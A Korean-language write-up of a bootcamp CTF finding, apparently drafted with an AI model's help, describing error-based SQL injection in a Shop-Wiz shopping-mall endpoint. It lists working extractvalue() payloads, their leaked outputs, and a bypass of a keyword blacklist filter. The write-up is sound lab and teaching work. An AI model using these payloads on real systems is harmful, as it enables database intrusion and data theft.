# 취약점 발견 요약 — bootcamp-ctf-web

어떤 요청을 보냈고, 어디서 어떻게 취약점이 발견됐는지를 정리한 사람이 읽기 쉬운 요약본.

## 대상 (Target)

| 항목 | 값 |
| --- | --- |
| 대상 | 100.121.79.125 (부트캠프 CTF, Tailscale VPN) |
| 소프트웨어 | 숍위즈(Shop-Wiz) 무료 쇼핑몰 솔루션, Apache/2.2.34 (Unix), PHP/5.2.17 |
| 취약 엔드포인트 | `GET /lib/out.banner.php?uid=` |
| DB | MySQL 5.1.73, 스키마 `wizmall`, 접속 계정 `wizmall@172.18.0.3` |
| CWE | CWE-89 (SQL Injection), 부가로 CWE-209(에러 메시지를 통한 정보노출) |

## 보낸 요청

```
GET /lib/out.banner.php?uid=1%20AND%20extractvalue(1,concat(0x7e,version())) HTTP/1.1
Host: 100.121.79.125
```

## 어디서 취약점이 발견됐나 (근본 원인 위치)

`lib/out.banner.php`가 배너 URL을 조회할 때 GET 파라미터 `uid`를 숫자형으로 가정하고
따옴표 없이 그대로 SQL 쿼리에 이어 붙이는 것으로 보인다(FACT — 에러 메시지에 노출된
쿼리 원문: `select url from wizbanner where uid=1 AND ...`). 문자열 파라미터
(`wizsearch.php`의 `keyword` 등)에는 `magic_quotes_gpc`류 이스케이프가 적용돼 있어
quote 기반 인젝션이 막히지만, 숫자형 파라미터는 quote가 필요 없어 이 보호를 그대로
우회한다(INFERENCE). 또한 이 서버는 `display_errors`가 켜져 있고 MySQL 에러 메시지를
가공 없이 그대로 응답에 포함시켜, error-based SQLi로 임의 데이터(버전, 계정, 스키마명 등)
추출이 가능하다(FACT).

키워드 블랙리스트 필터가 존재하는 것으로 보이나(`SUBSTRING`→`sub strING`,
`UPDATEXML`→`up datexml`, `DATABASE`→`data base`처럼 특정 하위 문자열 뒤에 공백이
삽입됨), 화이트리스트가 아닌 단순 문자열 치환 방식이라 `extractvalue()`, `schema()`
같은 필터되지 않은 동의어/대체 함수로 손쉽게 우회된다(FACT — 실제 요청으로 확인).

## 결과

| Target | 응답 | 판정 |
| --- | --- | --- |
| `uid=1` (baseline) | 302, `Location: /` | 정상(레코드 존재) |
| `uid=99999` (baseline) | 302, `Location:` (empty) | 정상(레코드 없음) |
| `uid=1 AND 1=1` | 302, `Location: /` | 참 조건 — SQLi 성립 |
| `uid=1 AND 1=2` | 302, `Location:` (empty) | 거짓 조건 — SQLi 성립 |
| `uid=1 AND extractvalue(1,concat(0x7e,version()))` | 200, `XPATH syntax error: '~5.1.73'` | error-based 데이터 추출 성공 |
| `uid=1 AND extractvalue(1,concat(0x7e,user()))` | 200, `XPATH syntax error: '~wizmall@172.18.0.3'` | error-based 데이터 추출 성공 |
| `uid=1 AND extractvalue(1,concat(0x7e,schema()))` | 200, `XPATH syntax error: '~wizmall'` | error-based 데이터 추출 성공, `database()` 필터 우회 |

## AI Draft vs 확정

- 위 요청/응답은 전부 실제 실행한 Tool Observation(FACT)이다.
- CWE 분류, "근본 원인 위치" 문단의 해석은 AI Draft(INFERENCE)이며, 학생의 최종 검토·
  확정 전까지 결론으로 취급하지 않는다.
- 실제 회원 테이블/비밀번호 등 Credential에 해당하는 데이터는 Scope 상 수집하지
  않았다 — 필요 시 학생이 별도로 GO 승인 후 진행 여부를 결정한다.

## 관련 파일

- `all-requests.md`, `all-results.md`
- `../recon.md`
